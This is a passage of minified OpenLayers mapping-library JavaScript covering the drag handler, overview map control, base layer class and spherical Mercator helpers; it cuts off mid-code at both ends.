b},dragmove:function(a){this.lastMoveEvt=a;!this.started||(this.timeoutId||a.xy.x==this.last.x&&a.xy.y==this.last.y)||(!0===this.documentDrag&&this.documentEvents&&(a.element===document?(this.adjustXY(a),this.setEvent(a)):this.removeDocumentEvents()),0<this.interval&&(this.timeoutId=setTimeout(OpenLayers.Function.bind(this.removeTimeout,this),this.interval)),this.dragging=!0,this.move(a),this.callback(\"move\",[a.xy]),this.oldOnselectstart||(this.oldOnselectstart=\ndocument.onselectstart,document.onselectstart=OpenLayers.Function.False),this.last=a.xy);return!0},dragend:function(a){if(this.started){!0===this.documentDrag&&this.documentEvents&&(this.adjustXY(a),this.removeDocumentEvents());var b=this.start!=this.last;this.dragging=this.started=!1;OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olDragDown\");this.up(a);this.callback(\"up\",[a.xy]);b&&this.callback(\"done\",[a.xy]);document.onselectstart=this.oldOnselectstart}return!0},down:function(a){},move:function(a){},\nup:function(a){},out:function(a){},mousedown:function(a){return this.dragstart(a)},touchstart:function(a){this.startTouch();return this.dragstart(a)},mousemove:function(a){return this.dragmove(a)},touchmove:function(a){return this.dragmove(a)},removeTimeout:function(){this.timeoutId=null;this.dragging&&this.mousemove(this.lastMoveEvt)},mouseup:function(a){return this.dragend(a)},touchend:function(a){a.xy=this.last;return this.dragend(a)},mouseout:function(a){if(this.started&&OpenLayers.Util.mouseLeft(a,\nthis.map.viewPortDiv))if(!0===this.documentDrag)this.addDocumentEvents();else{var b=this.start!=this.last;this.dragging=this.started=!1;OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olDragDown\");this.out(a);this.callback(\"out\",[]);b&&this.callback(\"done\",[a.xy]);document.onselectstart&&(document.onselectstart=this.oldOnselectstart)}return!0},click:function(a){return this.start==this.last},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&&(this.dragging=\n!1,a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&&(this.dragging=this.started=!1,this.last=this.start=null,a=!0,OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olDragDown\"));return a},adjustXY:function(a){var b=OpenLayers.Util.pagePosition(this.map.viewPortDiv);a.xy.x-=b[0];a.xy.y-=b[1]},addDocumentEvents:function(){OpenLayers.Element.addClass(document.body,\"olDragDown\");this.documentEvents=!0;OpenLayers.Event.observe(document,\"mousemove\",\nthis._docMove);OpenLayers.Event.observe(document,\"mouseup\",this._docUp)},removeDocumentEvents:function(){OpenLayers.Element.removeClass(document.body,\"olDragDown\");this.documentEvents=!1;OpenLayers.Event.stopObserving(document,\"mousemove\",this._docMove);OpenLayers.Event.stopObserving(document,\"mouseup\",this._docUp)},CLASS_NAME:\"OpenLayers.Handler.Drag\"});OpenLayers.Control.OverviewMap=OpenLayers.Class(OpenLayers.Control,{element:null,ovmap:null,size:{w:180,h:90},layers:null,minRectSize:15,minRectDisplayClass:\"RectReplacement\",minRatio:8,maxRatio:32,mapOptions:null,autoPan:!1,handlers:null,resolutionFactor:1,maximized:!1,maximizeTitle:\"\",minimizeTitle:\"\",initialize:function(a){this.layers=[];this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,[a])},destroy:function(){this.mapDiv&&(this.handlers.click&&this.handlers.click.destroy(),\nthis.handlers.drag&&this.handlers.drag.destroy(),this.ovmap&&this.ovmap.viewPortDiv.removeChild(this.extentRectangle),this.extentRectangle=null,this.rectEvents&&(this.rectEvents.destroy(),this.rectEvents=null),this.ovmap&&(this.ovmap.destroy(),this.ovmap=null),this.element.removeChild(this.mapDiv),this.mapDiv=null,this.div.removeChild(this.element),this.element=null,this.maximizeDiv&&(this.div.removeChild(this.maximizeDiv),this.maximizeDiv=null),this.minimizeDiv&&(this.div.removeChild(this.minimizeDiv),\nthis.minimizeDiv=null),this.map.events.un({buttonclick:this.onButtonClick,moveend:this.update,changebaselayer:this.baseLayerDraw,scope:this}),OpenLayers.Control.prototype.destroy.apply(this,arguments))},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);if(0===this.layers.length)if(this.map.baseLayer)this.layers=[this.map.baseLayer.clone()];else return this.map.events.register(\"changebaselayer\",this,this.baseLayerDraw),this.div;this.element=document.createElement(\"div\");this.element.className=\nthis.displayClass+\"Element\";this.element.style.display=\"none\";this.mapDiv=document.createElement(\"div\");this.mapDiv.style.width=this.size.w+\"px\";this.mapDiv.style.height=this.size.h+\"px\";this.mapDiv.style.position=\"relative\";this.mapDiv.style.overflow=\"hidden\";this.mapDiv.id=OpenLayers.Util.createUniqueID(\"overviewMap\");this.extentRectangle=document.createElement(\"div\");this.extentRectangle.style.position=\"absolute\";this.extentRectangle.style.zIndex=1E3;this.extentRectangle.className=this.displayClass+\n\"ExtentRectangle\";this.element.appendChild(this.mapDiv);this.div.appendChild(this.element);if(this.outsideViewport)this.element.style.display=\"\";else{this.div.className+=\" \"+this.displayClass+\"Container\";var a=OpenLayers.Util.getImageLocation(\"layer-switcher-maximize.png\");this.maximizeDiv=OpenLayers.Util.createAlphaImageDiv(this.displayClass+\"MaximizeButton\",null,null,a,\"absolute\");this.maximizeDiv.style.display=\"none\";this.maximizeDiv.className=this.displayClass+\"MaximizeButton olButton\";this.maximizeTitle&&\n(this.maximizeDiv.title=this.maximizeTitle);this.div.appendChild(this.maximizeDiv);a=OpenLayers.Util.getImageLocation(\"layer-switcher-minimize.png\");this.minimizeDiv=OpenLayers.Util.createAlphaImageDiv(\"OpenLayers_Control_minimizeDiv\",null,null,a,\"absolute\");this.minimizeDiv.style.display=\"none\";this.minimizeDiv.className=this.displayClass+\"MinimizeButton olButton\";this.minimizeTitle&&(this.minimizeDiv.title=this.minimizeTitle);this.div.appendChild(this.minimizeDiv);this.minimizeControl()}this.map.getExtent()&&\nthis.update();this.map.events.on({buttonclick:this.onButtonClick,moveend:this.update,scope:this});this.maximized&&this.maximizeControl();return this.div},baseLayerDraw:function(){this.draw();this.map.events.unregister(\"changebaselayer\",this,this.baseLayerDraw)},rectDrag:function(a){var b=this.handlers.drag.last.x-a.x,c=this.handlers.drag.last.y-a.y;if(0!=b||0!=c){var d=this.rectPxBounds.top,e=this.rectPxBounds.left;a=Math.abs(this.rectPxBounds.getHeight());var f=this.rectPxBounds.getWidth(),c=Math.max(0,\nd-c),c=Math.min(c,this.ovmap.size.h-this.hComp-a),b=Math.max(0,e-b),b=Math.min(b,this.ovmap.size.w-this.wComp-f);this.setRectPxBounds(new OpenLayers.Bounds(b,c+a,b+f,c))}},mapDivClick:function(a){var b=this.rectPxBounds.getCenterPixel(),c=a.xy.x-b.x,d=a.xy.y-b.y,e=this.rectPxBounds.top,f=this.rectPxBounds.left;a=Math.abs(this.rectPxBounds.getHeight());b=this.rectPxBounds.getWidth();d=Math.max(0,e+d);d=Math.min(d,this.ovmap.size.h-a);c=Math.max(0,f+c);c=Math.min(c,this.ovmap.size.w-b);this.setRectPxBounds(new OpenLayers.Bounds(c,\nd+a,c+b,d));this.updateMapToRect()},onButtonClick:function(a){a.buttonElement===this.minimizeDiv?this.minimizeControl():a.buttonElement===this.maximizeDiv&&this.maximizeControl()},maximizeControl:function(a){this.element.style.display=\"\";this.showToggle(!1);null!=a&&OpenLayers.Event.stop(a)},minimizeControl:function(a){this.element.style.display=\"none\";this.showToggle(!0);null!=a&&OpenLayers.Event.stop(a)},showToggle:function(a){this.maximizeDiv&&(this.maximizeDiv.style.display=a?\"\":\"none\");this.minimizeDiv&&\n(this.minimizeDiv.style.display=a?\"none\":\"\")},update:function(){null==this.ovmap&&this.createMap();!this.autoPan&&this.isSuitableOverview()||this.updateOverview();this.updateRectToMap()},isSuitableOverview:function(){var a=this.map.getExtent(),b=this.map.getMaxExtent(),a=new OpenLayers.Bounds(Math.max(a.left,b.left),Math.max(a.bottom,b.bottom),Math.min(a.right,b.right),Math.min(a.top,b.top));this.ovmap.getProjection()!=this.map.getProjection()&&(a=a.transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject()));\nb=this.ovmap.getResolution()/this.map.getResolution();return b>this.minRatio&&b<=this.maxRatio&&this.ovmap.getExtent().containsBounds(a)},updateOverview:function(){var a=this.map.getResolution(),b=this.ovmap.getResolution(),c=b/a;c>this.maxRatio?b=this.minRatio*a:c<=this.minRatio&&(b=this.maxRatio*a);this.ovmap.getProjection()!=this.map.getProjection()?(a=this.map.center.clone(),a.transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject())):a=this.map.center;this.ovmap.setCenter(a,\nthis.ovmap.getZoomForResolution(b*this.resolutionFactor));this.updateRectToMap()},createMap:function(){var a=OpenLayers.Util.extend({controls:[],maxResolution:\"auto\",fallThrough:!1},this.mapOptions);this.ovmap=new OpenLayers.Map(this.mapDiv,a);this.ovmap.viewPortDiv.appendChild(this.extentRectangle);OpenLayers.Event.stopObserving(window,\"unload\",this.ovmap.unloadDestroy);this.ovmap.addLayers(this.layers);this.ovmap.zoomToMaxExtent();this.wComp=(this.wComp=parseInt(OpenLayers.Element.getStyle(this.extentRectangle,\n\"border-left-width\"))+parseInt(OpenLayers.Element.getStyle(this.extentRectangle,\"border-right-width\")))?this.wComp:2;this.hComp=(this.hComp=parseInt(OpenLayers.Element.getStyle(this.extentRectangle,\"border-top-width\"))+parseInt(OpenLayers.Element.getStyle(this.extentRectangle,\"border-bottom-width\")))?this.hComp:2;this.handlers.drag=new OpenLayers.Handler.Drag(this,{move:this.rectDrag,done:this.updateMapToRect},{map:this.ovmap});this.handlers.click=new OpenLayers.Handler.Click(this,{click:this.mapDivClick},\n{single:!0,\"double\":!1,stopSingle:!0,stopDouble:!0,pixelTolerance:1,map:this.ovmap});this.handlers.click.activate();this.rectEvents=new OpenLayers.Events(this,this.extentRectangle,null,!0);this.rectEvents.register(\"mouseover\",this,function(a){this.handlers.drag.active||this.map.dragging||this.handlers.drag.activate()});this.rectEvents.register(\"mouseout\",this,function(a){this.handlers.drag.dragging||this.handlers.drag.deactivate()});if(this.ovmap.getProjection()!=this.map.getProjection()){var a=this.map.getProjectionObject().getUnits()||\nthis.map.units||this.map.baseLayer.units,b=this.ovmap.getProjectionObject().getUnits()||this.ovmap.units||this.ovmap.baseLayer.units;this.resolutionFactor=a&&b?OpenLayers.INCHES_PER_UNIT[a]/OpenLayers.INCHES_PER_UNIT[b]:1}},updateRectToMap:function(){var a;a=this.ovmap.getProjection()!=this.map.getProjection()?this.map.getExtent().transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject()):this.map.getExtent();(a=this.getRectBoundsFromMapBounds(a))&&this.setRectPxBounds(a)},updateMapToRect:function(){var a=\nthis.getMapBoundsFromRectBounds(this.rectPxBounds);this.ovmap.getProjection()!=this.map.getProjection()&&(a=a.transform(this.ovmap.getProjectionObject(),this.map.getProjectionObject()));this.map.panTo(a.getCenterLonLat())},setRectPxBounds:function(a){var b=Math.max(a.top,0),c=Math.max(a.left,0),d=Math.min(a.top+Math.abs(a.getHeight()),this.ovmap.size.h-this.hComp);a=Math.min(a.left+a.getWidth(),this.ovmap.size.w-this.wComp);var e=Math.max(a-c,0),f=Math.max(d-b,0);e<this.minRectSize||f<this.minRectSize?\n(this.extentRectangle.className=this.displayClass+this.minRectDisplayClass,e=c+e/2-this.minRectSize/2,this.extentRectangle.style.top=Math.round(b+f/2-this.minRectSize/2)+\"px\",this.extentRectangle.style.left=Math.round(e)+\"px\",this.extentRectangle.style.height=this.minRectSize+\"px\",this.extentRectangle.style.width=this.minRectSize+\"px\"):(this.extentRectangle.className=this.displayClass+\"ExtentRectangle\",this.extentRectangle.style.top=Math.round(b)+\"px\",this.extentRectangle.style.left=Math.round(c)+\n\"px\",this.extentRectangle.style.height=Math.round(f)+\"px\",this.extentRectangle.style.width=Math.round(e)+\"px\");this.rectPxBounds=new OpenLayers.Bounds(Math.round(c),Math.round(d),Math.round(a),Math.round(b))},getRectBoundsFromMapBounds:function(a){var b=this.getOverviewPxFromLonLat({lon:a.left,lat:a.bottom});a=this.getOverviewPxFromLonLat({lon:a.right,lat:a.top});var c=null;b&&a&&(c=new OpenLayers.Bounds(b.x,b.y,a.x,a.y));return c},getMapBoundsFromRectBounds:function(a){var b=this.getLonLatFromOverviewPx({x:a.left,\ny:a.bottom});a=this.getLonLatFromOverviewPx({x:a.right,y:a.top});return new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat)},getLonLatFromOverviewPx:function(a){var b=this.ovmap.size,c=this.ovmap.getResolution(),d=this.ovmap.getExtent().getCenterLonLat();return{lon:d.lon+(a.x-b.w/2)*c,lat:d.lat-(a.y-b.h/2)*c}},getOverviewPxFromLonLat:function(a){var b=this.ovmap.getResolution(),c=this.ovmap.getExtent();if(c)return{x:Math.round(1/b*(a.lon-c.left)),y:Math.round(1/b*(c.top-a.lat))}},CLASS_NAME:\"OpenLayers.Control.OverviewMap\"});OpenLayers.Layer=OpenLayers.Class({id:null,name:null,div:null,opacity:1,alwaysInRange:null,RESOLUTION_PROPERTIES:\"scales resolutions maxScale minScale maxResolution minResolution numZoomLevels maxZoomLevel\".split(\" \"),events:null,map:null,isBaseLayer:!1,alpha:!1,displayInLayerSwitcher:!0,visibility:!0,attribution:null,inRange:!1,imageSize:null,options:null,eventListeners:null,gutter:0,projection:null,units:null,scales:null,resolutions:null,maxExtent:null,minExtent:null,maxResolution:null,minResolution:null,\nnumZoomLevels:null,minScale:null,maxScale:null,displayOutsideMaxExtent:!1,wrapDateLine:!1,metadata:null,initialize:function(a,b){this.metadata={};b=OpenLayers.Util.extend({},b);null!=this.alwaysInRange&&(b.alwaysInRange=this.alwaysInRange);this.addOptions(b);this.name=a;if(null==this.id&&(this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\"_\"),this.div=OpenLayers.Util.createDiv(this.id),this.div.style.width=\"100%\",this.div.style.height=\"100%\",this.div.dir=\"ltr\",this.events=new OpenLayers.Events(this,\nthis.div),this.eventListeners instanceof Object))this.events.on(this.eventListeners)},destroy:function(a){null==a&&(a=!0);null!=this.map&&this.map.removeLayer(this,a);this.options=this.div=this.name=this.map=this.projection=null;this.events&&(this.eventListeners&&this.events.un(this.eventListeners),this.events.destroy());this.events=this.eventListeners=null},clone:function(a){null==a&&(a=new OpenLayers.Layer(this.name,this.getOptions()));OpenLayers.Util.applyDefaults(a,this);a.map=null;return a},\ngetOptions:function(){var a={},b;for(b in this.options)a[b]=this[b];return a},setName:function(a){a!=this.name&&(this.name=a,null!=this.map&&this.map.events.triggerEvent(\"changelayer\",{layer:this,property:\"name\"}))},addOptions:function(a,b){null==this.options&&(this.options={});a&&(\"string\"==typeof a.projection&&(a.projection=new OpenLayers.Projection(a.projection)),a.projection&&OpenLayers.Util.applyDefaults(a,OpenLayers.Projection.defaults[a.projection.getCode()]),!a.maxExtent||a.maxExtent instanceof\nOpenLayers.Bounds||(a.maxExtent=new OpenLayers.Bounds(a.maxExtent)),!a.minExtent||a.minExtent instanceof OpenLayers.Bounds||(a.minExtent=new OpenLayers.Bounds(a.minExtent)));OpenLayers.Util.extend(this.options,a);OpenLayers.Util.extend(this,a);this.projection&&this.projection.getUnits()&&(this.units=this.projection.getUnits());if(this.map){var c=this.map.getResolution(),d=this.RESOLUTION_PROPERTIES.concat([\"projection\",\"units\",\"minExtent\",\"maxExtent\"]),e;for(e in a)if(a.hasOwnProperty(e)&&0<=OpenLayers.Util.indexOf(d,\ne)){this.initResolutions();b&&this.map.baseLayer===this&&(this.map.setCenter(this.map.getCenter(),this.map.getZoomForResolution(c),!1,!0),this.map.events.triggerEvent(\"changebaselayer\",{layer:this}));break}}},onMapResize:function(){},redraw:function(){var a=!1;if(this.map){this.inRange=this.calculateInRange();var b=this.getExtent();b&&(this.inRange&&this.visibility)&&(this.moveTo(b,!0,!1),this.events.triggerEvent(\"moveend\",{zoomChanged:!0}),a=!0)}return a},moveTo:function(a,b,c){a=this.visibility;\nthis.isBaseLayer||(a=a&&this.inRange);this.display(a)},moveByPx:function(a,b){},setMap:function(a){null==this.map&&(this.map=a,this.maxExtent=this.maxExtent||this.map.maxExtent,this.minExtent=this.minExtent||this.map.minExtent,this.projection=this.projection||this.map.projection,\"string\"==typeof this.projection&&(this.projection=new OpenLayers.Projection(this.projection)),this.units=this.projection.getUnits()||this.units||this.map.units,this.initResolutions(),this.isBaseLayer||(this.inRange=this.calculateInRange(),\nthis.div.style.display=this.visibility&&this.inRange?\"\":\"none\"),this.setTileSize())},afterAdd:function(){},removeMap:function(a){},getImageSize:function(a){return this.imageSize||this.tileSize},setTileSize:function(a){this.tileSize=a=a?a:this.tileSize?this.tileSize:this.map.getTileSize();this.gutter&&(this.imageSize=new OpenLayers.Size(a.w+2*this.gutter,a.h+2*this.gutter))},getVisibility:function(){return this.visibility},setVisibility:function(a){a!=this.visibility&&(this.visibility=a,this.display(a),\nthis.redraw(),null!=this.map&&this.map.events.triggerEvent(\"changelayer\",{layer:this,property:\"visibility\"}),this.events.triggerEvent(\"visibilitychanged\"))},display:function(a){a!=(\"none\"!=this.div.style.display)&&(this.div.style.display=a&&this.calculateInRange()?\"block\":\"none\")},calculateInRange:function(){var a=!1;this.alwaysInRange?a=!0:this.map&&(a=this.map.getResolution(),a=a>=this.minResolution&&a<=this.maxResolution);return a},setIsBaseLayer:function(a){a!=this.isBaseLayer&&(this.isBaseLayer=\na,null!=this.map&&this.map.events.triggerEvent(\"changebaselayer\",{layer:this}))},initResolutions:function(){var a,b,c,d={},e=!0;a=0;for(b=this.RESOLUTION_PROPERTIES.length;a<b;a++)c=this.RESOLUTION_PROPERTIES[a],d[c]=this.options[c],e&&this.options[c]&&(e=!1);null==this.options.alwaysInRange&&(this.alwaysInRange=e);null==d.resolutions&&(d.resolutions=this.resolutionsFromScales(d.scales));null==d.resolutions&&(d.resolutions=this.calculateResolutions(d));if(null==d.resolutions){a=0;for(b=this.RESOLUTION_PROPERTIES.length;a<\nb;a++)c=this.RESOLUTION_PROPERTIES[a],d[c]=null!=this.options[c]?this.options[c]:this.map[c];null==d.resolutions&&(d.resolutions=this.resolutionsFromScales(d.scales));null==d.resolutions&&(d.resolutions=this.calculateResolutions(d))}var f;this.options.maxResolution&&\"auto\"!==this.options.maxResolution&&(f=this.options.maxResolution);this.options.minScale&&(f=OpenLayers.Util.getResolutionFromScale(this.options.minScale,this.units));var g;this.options.minResolution&&\"auto\"!==this.options.minResolution&&\n(g=this.options.minResolution);this.options.maxScale&&(g=OpenLayers.Util.getResolutionFromScale(this.options.maxScale,this.units));d.resolutions&&(d.resolutions.sort(function(a,b){return b-a}),f||(f=d.resolutions[0]),g||(g=d.resolutions[d.resolutions.length-1]));if(this.resolutions=d.resolutions){b=this.resolutions.length;this.scales=Array(b);for(a=0;a<b;a++)this.scales[a]=OpenLayers.Util.getScaleFromResolution(this.resolutions[a],this.units);this.numZoomLevels=b}if(this.minResolution=g)this.maxScale=\nOpenLayers.Util.getScaleFromResolution(g,this.units);if(this.maxResolution=f)this.minScale=OpenLayers.Util.getScaleFromResolution(f,this.units)},resolutionsFromScales:function(a){if(null!=a){var b,c,d;d=a.length;b=Array(d);for(c=0;c<d;c++)b[c]=OpenLayers.Util.getResolutionFromScale(a[c],this.units);return b}},calculateResolutions:function(a){var b,c,d=a.maxResolution;null!=a.minScale?d=OpenLayers.Util.getResolutionFromScale(a.minScale,this.units):\"auto\"==d&&null!=this.maxExtent&&(b=this.map.getSize(),\nc=this.maxExtent.getWidth()/b.w,b=this.maxExtent.getHeight()/b.h,d=Math.max(c,b));c=a.minResolution;null!=a.maxScale?c=OpenLayers.Util.getResolutionFromScale(a.maxScale,this.units):\"auto\"==a.minResolution&&null!=this.minExtent&&(b=this.map.getSize(),c=this.minExtent.getWidth()/b.w,b=this.minExtent.getHeight()/b.h,c=Math.max(c,b));\"number\"!==typeof d&&(\"number\"!==typeof c&&null!=this.maxExtent)&&(d=this.map.getTileSize(),d=Math.max(this.maxExtent.getWidth()/d.w,this.maxExtent.getHeight()/d.h));b=a.maxZoomLevel;\na=a.numZoomLevels;\"number\"===typeof c&&\"number\"===typeof d&&void 0===a?a=Math.floor(Math.log(d/c)/Math.log(2))+1:void 0===a&&null!=b&&(a=b+1);if(!(\"number\"!==typeof a||0>=a||\"number\"!==typeof d&&\"number\"!==typeof c)){b=Array(a);var e=2;\"number\"==typeof c&&\"number\"==typeof d&&(e=Math.pow(d/c,1/(a-1)));var f;if(\"number\"===typeof d)for(f=0;f<a;f++)b[f]=d/Math.pow(e,f);else for(f=0;f<a;f++)b[a-1-f]=c*Math.pow(e,f);return b}},getResolution:function(){var a=this.map.getZoom();return this.getResolutionForZoom(a)},\ngetExtent:function(){return this.map.calculateBounds()},getZoomForExtent:function(a,b){var c=this.map.getSize(),c=Math.max(a.getWidth()/c.w,a.getHeight()/c.h);return this.getZoomForResolution(c,b)},getDataExtent:function(){},getResolutionForZoom:function(a){a=Math.max(0,Math.min(a,this.resolutions.length-1));if(this.map.fractionalZoom){var b=Math.floor(a),c=Math.ceil(a);a=this.resolutions[b]-(a-b)*(this.resolutions[b]-this.resolutions[c])}else a=this.resolutions[Math.round(a)];return a},getZoomForResolution:function(a,\nb){var c,d;if(this.map.fractionalZoom){var e=0,f=this.resolutions[e],g=this.resolutions[this.resolutions.length-1],h;c=0;for(d=this.resolutions.length;c<d;++c)if(h=this.resolutions[c],h>=a&&(f=h,e=c),h<=a){g=h;break}c=f-g;c=0<c?e+(f-a)/c:e}else{f=Number.POSITIVE_INFINITY;c=0;for(d=this.resolutions.length;c<d;c++)if(b){e=Math.abs(this.resolutions[c]-a);if(e>f)break;f=e}else if(this.resolutions[c]<a)break;c=Math.max(0,c-1)}return c},getLonLatFromViewPortPx:function(a){var b=null,c=this.map;if(null!=\na&&c.minPx){var b=c.getResolution(),d=c.getMaxExtent({restricted:!0}),b=new OpenLayers.LonLat((a.x-c.minPx.x)*b+d.left,(c.minPx.y-a.y)*b+d.top);this.wrapDateLine&&(b=b.wrapDateLine(this.maxExtent))}return b},getViewPortPxFromLonLat:function(a,b){var c=null;null!=a&&(b=b||this.map.getResolution(),c=this.map.calculateBounds(null,b),c=new OpenLayers.Pixel(1/b*(a.lon-c.left),1/b*(c.top-a.lat)));return c},setOpacity:function(a){if(a!=this.opacity){this.opacity=a;for(var b=this.div.childNodes,c=0,d=b.length;c<\nd;++c){var e=b[c].firstChild||b[c],f=b[c].lastChild;f&&\"iframe\"===f.nodeName.toLowerCase()&&(e=f.parentNode);OpenLayers.Util.modifyDOMElement(e,null,null,null,null,null,null,a)}null!=this.map&&this.map.events.triggerEvent(\"changelayer\",{layer:this,property:\"opacity\"})}},getZIndex:function(){return this.div.style.zIndex},setZIndex:function(a){this.div.style.zIndex=a},adjustBounds:function(a){if(this.gutter){var b=this.gutter*this.map.getResolution();a=new OpenLayers.Bounds(a.left-b,a.bottom-b,a.right+\nb,a.top+b)}this.wrapDateLine&&(b={rightTolerance:this.getResolution(),leftTolerance:this.getResolution()},a=a.wrapDateLine(this.maxExtent,b));return a},CLASS_NAME:\"OpenLayers.Layer\"});OpenLayers.Layer.SphericalMercator={getExtent:function(){var a=null;return a=this.sphericalMercator?this.map.calculateBounds():OpenLayers.Layer.FixedZoomLevels.prototype.getExtent.apply(this)},getLonLatFromViewPortPx:function(a){return OpenLayers.Layer.prototype.getLonLatFromViewPortPx.apply(this,arguments)},getViewPortPxFromLonLat:function(a){return OpenLayers.Layer.prototype.getViewPortPxFromLonLat.apply(this,arguments)},initMercatorParameters:function(){this.RESOLUTIONS=[];for(var a=0;a<=this.MAX_ZOOM_LEVEL;++a)this.RESOLUTIONS[a]=\n156543.03390625/Math.pow(2,a);this.units=\"m\";this.projection=this.projection||\"EPSG:900913\"},forwardMercator:function(){var a=new OpenLayers.Projection(\"EPSG:4326\"),b=new OpenLayers.Projection(\"EPSG:900913\");return function(c,d){var e=OpenLayers.Projection.transform({x:c,y:d},a,b);return new OpenLayers.LonLat(e.x,e.y)}}(),inverseMercator:function(){var a=new OpenLayers.Projection(\"EPSG:4326\"),b=new OpenLayers.Projection(\"EPSG:900913\");return function(c,d){var e=OpenLayers.Projection.transform({x:c,\ny:d},b,a);return new OpenLayers.LonLat(e.x,e.y)}}()};OpenLayers.Layer.EventPane=OpenLayers.Class(OpenLayers.Layer,{smoothDragPan:!0,isBaseLayer:!0,isFixed:!0,pane:null,mapObject:null,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);null==this.pane&&(this.pane=OpenLayers.Util.createDiv(this.div.id+\"_EventPane\"))},destroy:function(){this.pane=this.mapObject=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Layer.prototype.setMap.apply(this,arguments);this.pane.style.zIndex=\nparseInt(this.div.style.zIndex)+1;this.pane.style.display=this.div.style.display;this.pane.style.width=\"100%\";this.pane.style.height=\"100%\";\"msie\"==OpenLayers.BROWSER_NAME&&(this.pane.style.background=\"url(\"+OpenLayers.Util.getImageLocation(\"blank.gif\")+\")\");this.isFixed?this.map.viewPortDiv.appendChild(this.pane):this.map.layerContainerDiv.appendChild(this.pane);this.loadMapObject();null==this.mapObject&&this.loadWarningMessage()},removeMap:function(a){this.pane&&this.pane.parentNode&&this.pane.parentNode.removeChild(this.pane);\nOpenLayers.Layer.prototype.removeMap.apply(this,arguments)},loadWarningMessage:function(){this.div.style.backgroundColor=\"darkblue\";var a=this.map.getSize(),b=Math.min(a.w,300),c=Math.min(a.h,200),b=new OpenLayers.Size(b,c),a=(new OpenLayers.Pixel(a.w/2,a.h/2)).add(-b.w/2,-b.h/2),a=OpenLayers.Util.createDiv(this.name+\"_warning\",a,b,null,null,null,\"auto\");a.style.padding=\"7px\";a.style.backgroundColor=\"yellow\";a.innerHTML=this.getWarningHTML();this.div.appendChild(a)},getWarningHTML:function(){return\"\"},\ndisplay:function(a){OpenLayers.Layer.prototype.display.apply(this,arguments);this.pane.style.display=this.div.style.display},setZIndex:function(a){OpenLayers.Layer.prototype.setZIndex.apply(this,arguments);this.pane.style.zIndex=parseInt(this.div.style.zIndex)+1},moveByPx:function(a,b){OpenLayers.Layer.prototype.moveByPx.apply(this,arguments);this.dragPanMapObject?this.dragPanMapObject(a,-b):this.moveTo(this.map.getCachedCenter())},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this,\narguments);if(null!=this.mapObject){var d=this.map.getCenter(),e=this.map.getZoom();if(null!=d){var f=this.getMapObjectCenter(),f=this.getOLLonLatFromMapObjectLonLat(f),g=this.getMapObjectZoom(),g=this.getOLZoomFromMapObjectZoom(g);d.equals(f)&&e==g||(!b&&f&&this.dragPanMapObject&&this.smoothDragPan?(e=this.map.getViewPortPxFromLonLat(f),d=this.map.getViewPortPxFromLonLat(d),this.dragPanMapObject(d.x-e.x,e.y-d.y)):(d=this.getMapObjectLonLatFromOLLonLat(d),e=this.getMapObjectZoomFromOLZoom(e),this.setMapObjectCenter(d,\ne,c)))}}},getLonLatFromViewPortPx:function(a){var b=null;null!=this.mapObject&&null!=this.getMapObjectCenter()&&(a=this.getMapObjectPixelFromOLPixel(a),a=this.getMapObjectLonLatFromMapObjectPixel(a),b=this.getOLLonLatFromMapObjectLonLat(a));return b},getViewPortPxFromLonLat:function(a){var b=null;null!=this.mapObject&&null!=this.getMapObjectCenter()&&(a=this.getMapObjectLonLatFromOLLonLat(a),a=this.getMapObjectPixelFromMapObjectLonLat(a),b=this.getOLPixelFromMapObjectPixel(a));return b},getOLLonLatFromMapObjectLonLat:function(a){var b=\nnull;null!=a&&(b=this.getLongitudeFromMapObjectLonLat(a),a=this.getLatitudeFromMapObjectLonLat(a),b=new OpenLayers.LonLat(b,a));return b},getMapObjectLonLatFromOLLonLat:function(a){var b=null;null!=a&&(b=this.getMapObjectLonLatFromLonLat(a.lon,a.lat));return b},getOLPixelFromMapObjectPixel:function(a){var b=null;null!=a&&(b=this.getXFromMapObjectPixel(a),a=this.getYFromMapObjectPixel(a),b=new OpenLayers.Pixel(b,a));return b},getMapObjectPixelFromOLPixel:function(a){var b=null;null!=a&&(b=this.getMapObjectPixelFromXY(a.x,\na.y));return b},CLASS_NAME:\"OpenLayers.Layer.EventPane\"});OpenLayers.Layer.FixedZoomLevels=OpenLayers.Class({initialize:function(){},initResolutions:function(){for(var a=[\"minZoomLevel\",\"maxZoomLevel\",\"numZoomLevels\"],b=0,c=a.length;b<c;b++){var d=a[b];this[d]=null!=this.options[d]?this.options[d]:this.map[d]}if(null==this.minZoomLevel||this.minZoomLevel<this.MIN_ZOOM_LEVEL)this.minZoomLevel=this.MIN_ZOOM_LEVEL;a=this.MAX_ZOOM_LEVEL-this.minZoomLevel+1;b=null==this.options.numZoomLevels&&null!=this.options.maxZoomLevel||null==this.numZoomLevels&&null!=this.maxZoomLevel?\nthis.maxZoomLevel-this.minZoomLevel+1:this.numZoomLevels;this.numZoomLevels=null!=b?Math.min(b,a):a;this.maxZoomLevel=this.minZoomLevel+this.numZoomLevels-1;if(null!=this.RESOLUTIONS){a=0;this.resolutions=[];for(b=this.minZoomLevel;b<=this.maxZoomLevel;b++)this.resolutions[a++]=this.RESOLUTIONS[b];this.maxResolution=this.resolutions[0];this.minResolution=this.resolutions[this.resolutions.length-1]}},getResolution:function(){if(null!=this.resolutions)return OpenLayers.Layer.prototype.getResolution.apply(this,\narguments);var a=null,b=this.map.getSize(),c=this.getExtent();null!=b&&null!=c&&(a=Math.max(c.getWidth()/b.w,c.getHeight()/b.h));return a},getExtent:function(){var a=this.map.getSize(),b=this.getLonLatFromViewPortPx({x:0,y:0}),a=this.getLonLatFromViewPortPx({x:a.w,y:a.h});return null!=b&&null!=a?new 